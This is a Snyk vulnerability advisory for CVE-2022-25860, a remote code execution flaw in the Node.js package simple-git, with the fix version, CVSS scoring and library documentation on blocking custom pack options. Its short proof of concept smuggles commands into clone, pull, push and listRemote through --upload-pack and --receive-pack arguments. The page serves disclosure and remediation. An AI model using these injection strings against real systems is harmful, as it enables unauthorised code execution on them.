### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.

#### Introduced: 20 Dec 2022

[CVE-2022-25860  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2022-25860) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-94  (opens in a new tab)](https://cwe.mitre.org/data/definitions/94.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `simple-git` to version 3.16.0 or higher.

## Overview

[simple-git](https://www.npmjs.com/package/simple-git) is a light weight interface for running git commands in any node.js application.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) via the `clone()`, `pull()`, `push()` and `listRemote()` methods, due to improper input sanitization.
This vulnerability exists due to an incomplete fix of [CVE-2022-25912](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221).

## PoC

```
const simpleGit = require('simple-git');
let git = simpleGit();
git.clone('-u touch /tmp/pwn', 'file:///tmp/zero12');
git.pull('--upload-pack=touch /tmp/pwn0', 'master');
git.push('--receive-pack=touch /tmp/pwn1', 'master');
git.listRemote(['--upload-pack=touch /tmp/pwn2', 'main']);

```

### CVSS Scores

version 3.1
### Snyk

8.1 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  A successful attack depends on conditions beyond the attacker's control. That is, a successful attack cannot be accomplished at will, but requires the attacker to invest in some measurable amount of effort in preparation or execution against the vulnerable component before a successful attack can be expected.

  **High**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**

|  |  | Instead of using the default `git-receive-pack` and `git-upload-pack` binaries to parse incoming and outgoing |
|  |  | data, `git` can be configured to use \_any\_ arbitrary binary or evaluable script. |
|  |  |  |
|  |  | To avoid accidentally triggering the evaluation of a malicious script when merging user provided parameters |
|  |  | into command executed by `simple-git`, custom pack options (usually with the `--receive-pack` and `--upload-pack`) |
|  |  | are blocked without explicitly opting into their use |
|  |  |  |

|  |  | import { simpleGit } from 'simple-git'; |
|  |  |  |
|  |  | // throws |
|  |  | await simpleGit() |
|  |  | .raw('push', '--receive-pack=git-receive-pack-custom'); |
|  |  |  |
|  |  | // allows calling clone with a helper transport |
|  |  | await simpleGit({ unsafe: { allowUnsafePack: true } }) |
|  |  | .raw('push', '--receive-pack=git-receive-pack-custom'); |
